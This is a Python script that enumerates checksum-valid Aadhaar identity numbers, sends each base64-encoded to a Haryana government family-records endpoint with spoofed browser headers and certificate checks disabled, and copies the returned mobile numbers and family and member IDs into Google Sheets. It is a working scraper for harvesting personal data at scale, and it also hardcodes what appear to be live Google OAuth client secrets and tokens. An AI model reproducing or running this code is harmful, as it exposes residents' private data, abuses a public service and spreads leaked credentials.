
import sys, os, requests, base64, json, threading, time, socket
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from uid import uid, validate_uid  # your UID generator
# from uid import _d, _p, _inv     # no heed to explain we using  uid.py
import urllib3
from urllib.parse import urlencode

# ✅ SSL warnings disable
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# === CONFIG ===
LAST_SERIAL_FILE = "last_serial.txt"
SHEET_STATE_FILE = "sheet_state.json"
MAX_ROWS_PER_SHEET = 10000
BATCH_SIZE = 10
TOTAL_LIMIT = 50
THREADS = 1
RETRIES = 3
ERROR_LIMIT = 10
API_URL = "https://ppp-office.haryana.gov.in/ReportGrievance/SearchFamilyByAadharNo"

# 🔐 OAuth credentials
CLIENT_ID = "737936576743-5dq4nrm7gemrhcks9k4rj5jb0i1futqh.apps.googleusercontent.com"
CLIENT_SECRET = "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"
REFRESH_TOKEN = "1//04SZPj0Na1xgFCgYIARAAGAQSNwF-L9IrvlAvyrcEU5z2rVto6skNdq9MgFjQUAIPA7zfdJ6yhnT3zz77EpVEmXPCU7gWnSviCzo"
ACCESS_TOKEN = "ya29.a0AS3H6Nxk4L6qLjkxisU4QEfSvFFU3PyzNL5XFNRL1ZYhp1OLa4yVTavEeNTfjytwMJ4njQSVugnW-5sOV-araEOTpvUwxMDwXcuYc81YYoDVMXCchNMi2r98q-ztaCU4lnmvy4Ml1clfVqciuZY1KylSHTKkVlYEDVLrZXToexW4w4i97eElucopHsJ5GtdbVRtX34waCgYKAcUSARMSFQHGX2MimISWb5_lv3XIgKWZcpPozg0206"

SHEET_PREFIX = "UID_Results_"
SHEET_HEADERS = ["serial", "uid", "status", "Mobileno", "NewMemberID", "NewFamilyID", "checked_at"]

# === Globals ===
lock = threading.Lock()
ok_results = []
error_count = 0
first_digit = 2

# === OAuth Refresh ===
def refresh_access_token():
    global ACCESS_TOKEN
    token_url = "https://oauth2.googleapis.com/token"
    payload = {
        "client_id": CLIENT_ID,
        "client_secret": CLIENT_SECRET,
        "refresh_token": REFRESH_TOKEN,
        "grant_type": "refresh_token"
    }
    res = requests.post(token_url, data=payload)
    if res.status_code == 200:
        ACCESS_TOKEN = res.json()["access_token"]
        print("🔄 Access token refreshed.")
        return True
    else:
        print("❌ Token refresh failed:", res.text)
        return False

# === Sheet State ===
def load_sheet_state():
    if not os.path.exists(SHEET_STATE_FILE): return None
    try:
        with open(SHEET_STATE_FILE, "r") as f:
            return json.load(f)
    except: return None

# def save_sheet_state(sheet_name, sheet_id):
#     with open(SHEET_STATE_FILE, "w") as f:
#         json.dump({"sheet_name": sheet_name, "sheet_id": sheet_id}, f, indent=2)
def save_sheet_state(sheet_name, sheet_id, row_count=0, created_at=None):
    state = {
        "sheet_name": sheet_name,
        "sheet_id": sheet_id,
        "row_count": row_count,
        "created_at": created_at or datetime.utcnow().isoformat()
    }
    with open(SHEET_STATE_FILE, "w") as f:
        json.dump(state, f, indent=2)

def commit_json_to_git():
    os.system('git config --global user.name "GitHub Actions"')
    os.system('git config --global user.email "actions@github.com"')
    os.system('git add sheet_state.json')
    os.system('git diff --cached --quiet || (git commit -m "Update sheet ID" && git push)')

# === Google Sheets ===
def create_new_sheet(file_no):
    if not refresh_access_token():
        print("❌ Cannot proceed without valid access token.")
        return None
    sheet_name = f"{SHEET_PREFIX}{file_no}"
    url = "https://sheets.googleapis.com/v4/spreadsheets"
    headers = {
        "Authorization": f"Bearer {ACCESS_TOKEN}",
        "Content-Type": "application/json"
    }
    body = {"properties": {"title": sheet_name}}
    res = requests.post(url, headers=headers, data=json.dumps(body))
    if res.status_code == 200:
        sheet_id = res.json()["spreadsheetId"]
        # save_sheet_state(sheet_name, sheet_id)
        save_sheet_state(sheet_name, sheet_id, row_count=0, created_at=datetime.utcnow().isoformat())
        commit_json_to_git()
        write_headers(sheet_id)
        return sheet_id
    else:
        print("❌ Sheet creation failed:", res.text)
        return None

def write_headers(sheet_id):
    url = f"https://sheets.googleapis.com/v4/spreadsheets/{sheet_id}/values/Sheet1!A1:append"
    headers = {"Authorization": f"Bearer {ACCESS_TOKEN}", "Content-Type": "application/json"}
    params = {"valueInputOption": "RAW"}
    data = {"values": [SHEET_HEADERS]}
    requests.post(url, headers=headers, params=params, data=json.dumps(data))

def write_batch_to_sheet(rows, sheet_id):
    url = f"https://sheets.googleapis.com/v4/spreadsheets/{sheet_id}/values/Sheet1!A1:append"
    headers = {"Authorization": f"Bearer {ACCESS_TOKEN}", "Content-Type": "application/json"}
    params = {"valueInputOption": "RAW"}
    data = {"values": rows}
    res = requests.post(url, headers=headers, params=params, data=json.dumps(data))
    if res.status_code == 200:
        print(f"📊 {len(rows)} rows written to sheet.")
        return True
    elif res.status_code == 401:
        refresh_access_token()
        return write_batch_to_sheet(rows, sheet_id)
    else:
        print("❌ Sheet write failed:", res.text)
        return False

def get_logged_uids(sheet_id):
    url = f"https://sheets.googleapis.com/v4/spreadsheets/{sheet_id}/values/Sheet1"
    headers = {"Authorization": f"Bearer {ACCESS_TOKEN}"}
    res = requests.get(url, headers=headers)
    if res.status_code == 200:
        values = res.json().get("values", [])[1:]
        return {row[1] for row in values if len(row) > 1}
    return set()

# === Server Recovery ===
# def is_internet_available():
#     try:
#         socket.create_connection(("8.8.8.8", 53), timeout=5)
#         return True
#     except OSError:
#         return False

# def is_server_alive():
#     try:
#         r = requests.get(API_URL, params={"AadharNo": "test"}, timeout=10, verify=False)
#         return r.status_code == 200
#     except:
#         return False

# def wait_for_recovery():
#     while not is_internet_available():
#         print("🌐 Internet down, retrying in 10 sec...")
#         time.sleep(10)
#     delay = 60
#     attempts = 0
#     while not is_server_alive():
#         print(f"🖥️ Server down, retrying in {delay//60} min...")
#         time.sleep(delay)
#         attempts += 1
#         if attempts >= 10 and delay < 300: delay = 300
#         if attempts >= 20 and delay < 1800: delay = 1800

# === UID Check ===
# def check_uid(serial, uid_val, logged_uids):
#     global error_count
#     # print(f"Debug: Checking serial={serial}, UID={uid_val}")
#     if uid_val in logged_uids: return True
#     if not validate_uid(uid_val):
#         print(f"❌ Invalid UID format: {uid_val}")
#         return False
#     encoded_uid = base64.b64encode(uid_val.encode()).decode()
#     # params = {"AadharNo": encoded_uid}
#     params = {"AadharNo": uid_val}   # test only
#     print(f"Debug: {encoded_uid}")
#     print(f"Debug: Sending API request with params: {params}")
#     print(f"Debug: Sending API request with encoded UID={base64.b64encode(uid_val.encode()).decode()}")
#     for attempt in range(RETRIES):
#         try:
#             r = requests.get(API_URL, params=params, verify=False, timeout=5)
#             print(f"Debug: Full request URL: {r.url}")
#             print(f"Debug: 2: {params}")
#             print(f"Debug: Response status={r.status_code}, response text={r.text[:100]}, response text 2={r.json[:100]}")  # print first 100 chars
#             print(f"Debug: 23: {r.status_code}")

#             if r.status_code == 200:
#                 try:
#                     data = r.json()
#                     if not data: return True
#                     item = data[0]
#                     for key in ["Mobileno", "NewMemberID", "NewFamilyID"]:
#                         if item.get(key):
#                             try: item[key] = base64.b64decode(item[key]).decode("utf-8")
#                             except: pass
#                     row = [
#                         str(serial), uid_val, str(r.status_code),
#                         item.get("Mobileno", ""), item.get("NewMemberID", ""),
#                         item.get("NewFamilyID", ""), time.strftime("%Y-%m-%d %H:%M:%S")
#                     ]
#                     with lock: ok_results.append(row)
#                     return True
#                 except Exception as e:
#                     print(f"❌ JSON parse error for UID={uid_val}: {e}")
#                     return False
#             else:
#                 with lock: error_count += 1
#                 return False
#         except Exception as e:
#             if attempt == RETRIES - 1:
#                 print(f"❌ Request failed for UID={uid_val}: {e}")
#                 with lock: error_count += 1
#             else:
#                 time.sleep(0.5)
#     return False

# === UID Check ===
# === UID Check ===
def check_uid(serial, uid_val, logged_uids):
    global error_count
    if uid_val in logged_uids:
        return True
    if not validate_uid(uid_val):
        print(f"❌ Invalid UID format: {uid_val}")
        return False

    # Aadhaar को base64 में encode करके भेजना होगा
    encoded_uid = base64.b64encode(uid_val.encode()).decode()
    params = {"AadharNo": encoded_uid}
    # print(f"🔍 Checking UID={uid_val}, Encoded={encoded_uid}")
    for attempt in range(RETRIES):
        try:
            r = requests.get(API_URL, params=params, verify=False, timeout=5, headers={
            "User-Agent": "Mozilla/5.0",
            "Accept": "application/json, text/plain, */*",
            "X-Requested-With": "XMLHttpRequest",
            "Referer": "https://ppp-office.haryana.gov.in/ReportGrievance",
        })
            print(f"➡️ Full URL: {r.url}")
            print(f"➡️ Status={r.status_code}, Response={r.text[:120]}")

            if r.status_code == 200:
                try:
                    data = r.json()
                    if not data:   # blank [] → कोई record नहीं
                        return True

                    item = data[0]

                    # decode Base64 fields
                    for key in ["Mobileno", "NewMemberID", "NewFamilyID"]:
                        if item.get(key):
                            try:
                                item[key] = base64.b64decode(item[key]).decode("utf-8")
                            except Exception:
                                pass  # अगर decode fail हुआ तो raw ही छोड़ देंगे

                    # Prepare row for sheet
                    row = [
                        str(serial), uid_val, str(r.status_code),
                        item.get("Mobileno", ""), item.get("NewMemberID", ""),
                        item.get("NewFamilyID", ""), time.strftime("%Y-%m-%d %H:%M:%S")
                    ]

                    with lock:
                        ok_results.append(row)

                    return True

                except Exception as e:
                    print(f"❌ JSON parse error for UID={uid_val}: {e}")
                    return False
            else:
                with lock:
                    error_count += 1
                return False

        except Exception as e:
            if attempt == RETRIES - 1:
                print(f"❌ Request failed for UID={uid_val}: {e}")
                with lock:
                    error_count += 1
            else:
                time.sleep(0.5)

    return False

# def validate_uid(uid12: str) -> bool:
#     """Validate a 12-digit UID using Verhoeff checksum."""
#     if not (isinstance(uid12, str) and uid12.isdigit() and len(uid12) == 12):
#         return False
#     c = 0
#     for i, ch in enumerate(reversed(uid12)):
#         c = _d[c][_p[i % 8][ord(ch) - 48]]
#     return c == 0

# === Batch Processing ===
def process_batch(batch_serials, logged_uids):
    global error_count
    error_count = 0
    ok_results.clear()
    uids_batch = [(s, uid(s, first_digit)) for s in batch_serials]
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        executor.map(lambda tup: check_uid(tup[0], tup[1], logged_uids), uids_batch)
    if error_count > ERROR_LIMIT:
        print(f"❌ Too many errors ({error_count}), entering recovery mode...")
        wait_for_recovery()
        return False
    return True

def main():
    print("🚀 UID Checker started")
    global first_digit
    try:
        with open(LAST_SERIAL_FILE, "r") as f:
            content = f.read().strip()
            if content:
                parts = content.split(",")
                if len(parts) == 2:
                    first_digit = int(parts[0])
                    start_serial = int(parts[1])
                else:
                    first_digit = 2
                    start_serial = 0
            else:
                first_digit = 2
                start_serial = 0
    except FileNotFoundError:
        first_digit = 2
        start_serial = 0
    end_serial = start_serial + TOTAL_LIMIT - 1

    # Load or create sheet
    state = load_sheet_state()
    if state:
        sheet_id = state["sheet_id"]
        sheet_name = state["sheet_name"]
        file_no = int(sheet_name.split("_")[-1])
    else:
        file_no = 1
        sheet_id = create_new_sheet(file_no)
        sheet_name = f"{SHEET_PREFIX}{file_no}"
        save_sheet_state(sheet_name, sheet_id, row_count=0, created_at=datetime.utcnow().isoformat()) 
        # save_sheet_state(sheet_name, sheet_id)  # <- ADD here
        if not sheet_id:
            print("❌ Sheet creation failed. sheet_state.json not created. Exiting.")
            print("🧪 Debug: sheet_id is None, likely due to token, quota, or API error.")
            return

    logged_uids = get_logged_uids(sheet_id)
    current_serial = start_serial

    while current_serial <= end_serial:
        batch_end = min(current_serial + BATCH_SIZE - 1, end_serial)
        batch_serials = list(range(current_serial, batch_end + 1))
        print(f"🔍 Processing {current_serial} → {batch_end}")

        success = process_batch(batch_serials, logged_uids)

        if not success:
            print("⚠️ Batch failed. Retrying after recovery...")
            continue  # Retry same batch after recovery

        # Rotate sheet if row limit exceeded
        if len(logged_uids) + len(ok_results) >= MAX_ROWS_PER_SHEET:
            file_no += 1
            sheet_id = create_new_sheet(file_no)
            sheet_name = f"{SHEET_PREFIX}{file_no}"
            logged_uids = set()
            save_sheet_state(sheet_name, sheet_id, row_count=0, created_at=datetime.utcnow().isoformat())  # <- ADD this line to update json file
            if not sheet_id:
                print("❌ Sheet rotation failed. Exiting.")
                return

        # Write results to sheet
        ok_results[:] = [row for row in ok_results if validate_uid(row[1])]
        if not ok_results:
            print("⚠️ ⚠️No valid UIDs in batch. Skipping write.")
            current_serial = batch_end + 1
            continue

        success = write_batch_to_sheet(ok_results, sheet_id)
        if success:
            logged_uids.update([row[1] for row in ok_results])
            try:
                with open(LAST_SERIAL_FILE, "w") as f:
                    f.write(f"{first_digit},{batch_end}")
                    print(f"Debug: last_serial.txt updated with {first_digit},{batch_end}")
            except Exception as e:
                print(f"Error updating last_serial.txt: {e}")
            #========================================================
            with open(SHEET_STATE_FILE, "r") as f:
                state = json.load(f)
            row_count = state.get("row_count", 0) + len(ok_results)
            save_sheet_state(sheet_name, sheet_id, row_count=row_count, created_at=state.get("created_at"))
            #====================================================
            current_serial = batch_end + 1
        else:
            print("❌ Failed to write batch to sheet. Retrying...")
       
   
    while current_serial > end_serial and first_digit < 9:
        first_digit += 1
        current_serial = 0
        end_serial = TOTAL_LIMIT - 1
        with open(LAST_SERIAL_FILE, "w") as f:
            f.write(f"{first_digit},{current_serial}")
        file_no += 1
        sheet_id = create_new_sheet(file_no)
        if not sheet_id:
            print("❌ Sheet creation failed during digit rotation.")
            return
        logged_uids = get_logged_uids(sheet_id)
        print(f"🔄 Moved to next digit: {first_digit}")

    print(f"🎯 Completed range {start_serial} → {end_serial}")
if __name__ == "__main__":
    main()
